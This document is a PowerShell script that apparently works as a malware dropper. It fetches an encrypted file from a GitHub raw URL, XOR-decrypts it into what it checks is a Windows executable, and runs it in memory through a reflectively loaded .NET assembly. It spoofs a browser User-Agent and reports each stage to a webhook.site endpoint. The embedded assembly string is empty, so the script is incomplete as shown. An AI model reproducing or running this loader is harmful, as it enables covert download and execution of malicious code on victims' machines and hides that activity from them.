$dl  = "https://raw.githubusercontent.com/Intel-Boss/e/main/config.dat"
$k   = [byte[]]@(0x6C,0xD6,0x9B,0x5A,0xE3,0x6B,0xA4,0xF5,0xA6,0x2F,0xF0,0x32,0xD9,0x32,0xAA,0xDC)
$wh  = "https://webhook.site/0b31b20b-d0b4-4991-beaf-6ae46965c829"

function Post($msg) { try { (New-Object Net.WebClient).UploadString($wh, $msg) } catch {} }

try {

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Post "1:download_start"

$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
$enc = $wc.DownloadData($dl)

Post "2:downloaded,$($enc.Length)bytes"

$buf = [byte[]]::new($enc.Length)
for ($i = 0; $i -lt $enc.Length; $i++) { $buf[$i] = $enc[$i] -bxor $k[$i % $k.Length] }

Post "3:decrypted,MZ=$([char]$buf[0]+[char]$buf[1])"

$a = [Reflection.Assembly]::Load([Convert]::FromBase64String(""))

Post "4:asm_loaded"

$m = $a.GetType("R").GetMethod("E")
$p = [object[]]::new(2)
$p[0] = [byte[]]$buf
$p[1] = [string]"Run"
$score = $m.Invoke($null, $p)

Post "5:done,score=$score"

} catch { Post "ERR:$($_.Exception.Message)" }
